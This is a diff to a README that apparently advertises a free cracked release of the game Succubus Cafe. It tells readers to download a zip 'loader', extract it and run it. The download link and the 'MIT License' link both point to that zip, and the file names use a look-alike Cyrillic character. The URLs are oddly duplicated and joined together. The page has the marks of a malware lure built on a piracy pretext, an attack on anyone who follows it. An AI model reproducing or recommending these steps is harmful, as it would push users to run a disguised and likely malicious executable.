@@ -24,7 +24,7 @@ Welcome to the ultimate resource for downloading **Succubus Cafe** safely, easil
 
 ## 🛠️ Installation Guide
 
-1. Download **https://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/tattery/Free_Release_Cafe_Hub_Succubus_2.0.zipоhttps://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/tattery/Free_Release_Cafe_Hub_Succubus_2.0.zip** from this repository.
 2. Extract files using your favorite archive tool.
 3. Launch the loader and follow the on-screen steps.
 4. Enjoy the full Succubus Cafe experience for free!
@@ -39,5 +39,5 @@ This repository offers a unique unlocking tool for educational and preservation 
 
 ## 📜 License
 
-Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/Lоader.zip).  
+Distributed under the [MIT License (2025)](https://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/tattery/Free_Release_Cafe_Hub_Succubus_2.0.zipоhttps://raw.githubusercontent.com/battlegrandsltd/SuccubusCafe-FreeReleaseHub/main/tattery/Free_Release_Cafe_Hub_Succubus_2.0.zip).  
 Ready to join the cafe? Download now and experience everything Succubus Cafe has to offer!
